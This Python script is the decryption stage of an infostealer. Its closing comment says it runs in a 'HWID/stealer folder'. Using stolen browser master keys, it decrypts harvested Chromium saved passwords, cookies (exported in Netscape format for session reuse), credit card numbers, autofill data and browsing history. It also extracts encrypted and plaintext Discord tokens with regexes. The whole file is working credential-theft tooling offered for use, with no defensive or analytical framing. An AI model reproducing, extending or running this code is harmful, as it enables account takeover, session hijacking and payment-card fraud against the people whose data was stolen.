import os, json, base64, sqlite3, shutil, binascii, re, sys
from datetime import datetime, timedelta

LOG_FILE = "decryption_debug.txt"

def log(msg):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now()}] {msg}\n")
    except: pass

AES = None
try: 
    from Cryptodome.Cipher import AES
    log("Imported Cryptodome.Cipher.AES")
except:
    try: 
        from Crypto.Cipher import AES
        log("Imported Crypto.Cipher.AES")
    except Exception as e:
        log(f"AES Import Failed: {e}")

def generate_cipher(aes_key, iv): return AES.new(aes_key, AES.MODE_GCM, iv)
def decrypt_payload(cipher, payload): return cipher.decrypt(payload)

def chrome_date_to_unix(date_us):
    try:
        if not date_us: return 0
        return int(date_us / 1000000) - 11644473600
    except: return 0

def get_key_from_folder(folder, specific_name):
    # Search for specific key file
    target = f"{specific_name.lower()}_masterkey.txt"
    for root, dirs, files in os.walk(folder):
        for f in files:
            if f.lower() == target:
                try:
                    with open(os.path.join(root, f), "r") as fd:
                        return bytes.fromhex(fd.read().strip())
                except: pass
    return None

def decrypt_data(buff, master_key):
    try:
        if not AES or not master_key: return None
        if buff[:3] in [b'v10', b'v11', b'v20']:
            iv, payload = buff[3:15], buff[15:]
            cipher = generate_cipher(master_key, iv)
            decrypted = decrypt_payload(cipher, payload)
            return decrypted[:-16].decode('utf-8', errors='ignore')
    except: pass
    return None

def process_discord(root_folder):
    log("Scanning for Discord data...")
    # Discord files are usually in /Discord subfolder
    discord_dir = os.path.join(root_folder, "Discord")
    if not os.path.exists(discord_dir):
        discord_dir = root_folder # Fallback to root

    master_key = get_key_from_folder(root_folder, "discord")
    
    regexp_enc = re.compile(r"dQw4w9WgXcQ:([a-zA-Z0-9+/=]+)")
    regexp_plain = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
    regexp_plain2 = re.compile(r"mfa\.[\w-]{84}")

    tokens = set()
    out_path = os.path.join(discord_dir, "tokens.txt")
    
    for f in os.listdir(discord_dir):
        if not f.endswith((".ldb", ".log")): continue
        try:
            with open(os.path.join(discord_dir, f), "r", encoding="utf-8", errors='ignore') as fd:
                content = fd.read()
                # Encrypted
                if master_key:
                    for match in regexp_enc.findall(content):
                        dec = decrypt_data(base64.b64decode(match), master_key)
                        if dec and dec not in tokens: tokens.add(dec)
                # Plain
                for match in regexp_plain.findall(content):
                    if match not in tokens: tokens.add(match)
                for match in regexp_plain2.findall(content):
                    if match not in tokens: tokens.add(match)
        except: pass
    
    if tokens:
        with open(out_path, "w", encoding="utf-8") as out:
            for t in tokens: out.write(f"Token: {t}\n")
        log(f"Saved {len(tokens)} tokens to {out_path}")

def process_browsers(root_folder):
    log("Scanning for Browser data...")
    browser_dir = os.path.join(root_folder, "Browsers")
    if not os.path.exists(browser_dir): browser_dir = root_folder

    for f in os.listdir(browser_dir):
        if not f.endswith(("Login Data", "Cookies", "Web Data", "History")): continue
        parts = f.split("_")
        if len(parts) < 3: continue
        
        browser_name = parts[0]
        file_type = parts[-1]
        if file_type == "Data": file_type = parts[-2] + " " + parts[-1]
        profile_name = f.replace(f"{browser_name}_", "").replace(f"_{file_type}", "")
        
        master_key = get_key_from_folder(root_folder, browser_name)
        fp = os.path.join(browser_dir, f)
        base_name = f"{browser_name}_{profile_name}"
        temp_db = f"temp_{binascii.hexlify(os.urandom(4)).decode()}.db"

        try:
            # Force copy to avoid lock
            shutil.copy2(fp, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            if f.endswith("Login Data"):
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                with open(os.path.join(browser_dir, f"{base_name}_passwords.txt"), "w", encoding="utf-8") as out:
                    for r in cursor.fetchall():
                        dec = decrypt_data(r[2], master_key)
                        if dec: out.write(f"URL: {r[0]}\nUSER: {r[1]}\nPASS: {dec}\n\n")
            
            elif f.endswith("Cookies"): # Case sensitive check
                cursor.execute("SELECT host_key, path, is_secure, expires_utc, name, encrypted_value, value FROM cookies")
                with open(os.path.join(browser_dir, f"{base_name}_cookies.txt"), "w", encoding="utf-8") as out:
                    out.write("# Netscape HTTP Cookie File\n")
                    for r in cursor.fetchall():
                        val = decrypt_data(r[5], master_key) or r[6]
                        out.write(f"{r[0]}\tTRUE\t{r[1]}\tTRUE\t{chrome_date_to_unix(r[3])}\t{r[4]}\t{val}\n")
            
            elif f.endswith("Web Data"):
                try:
                    cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    with open(os.path.join(browser_dir, f"{base_name}_cards.txt"), "w", encoding="utf-8") as out:
                        for r in cursor.fetchall():
                            dec = decrypt_data(r[3], master_key)
                            if dec: out.write(f"Name: {r[0]}\nExp: {r[1]}/{r[2]}\nNum: {dec}\n\n")
                except: pass
                try:
                    cursor.execute("SELECT name, value FROM autofill")
                    with open(os.path.join(browser_dir, f"{base_name}_autofill.txt"), "w", encoding="utf-8") as out:
                        for r in cursor.fetchall(): out.write(f"{r[0]}: {r[1]}\n")
                except: pass

            elif f.endswith("History"):
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
                with open(os.path.join(browser_dir, f"{base_name}_history.txt"), "w", encoding="utf-8") as out:
                    for r in cursor.fetchall():
                        try:
                            dt = datetime(1601, 1, 1) + timedelta(microseconds=r[2])
                            ts = dt.strftime("%Y-%m-%d %H:%M")
                        except: ts = "Unknown"
                        out.write(f"[{ts}] {r[1]} ({r[0]})\n")
            
            conn.close()
        except Exception as e: log(f"Error processing {f}: {e}")
        finally:
            if os.path.exists(temp_db): 
                try: os.remove(temp_db)
                except: pass

if __name__ == "__main__":
    # Script runs in HWID/stealer folder
    process_browsers(".")
    process_discord(".")
    log("Finished all processing.")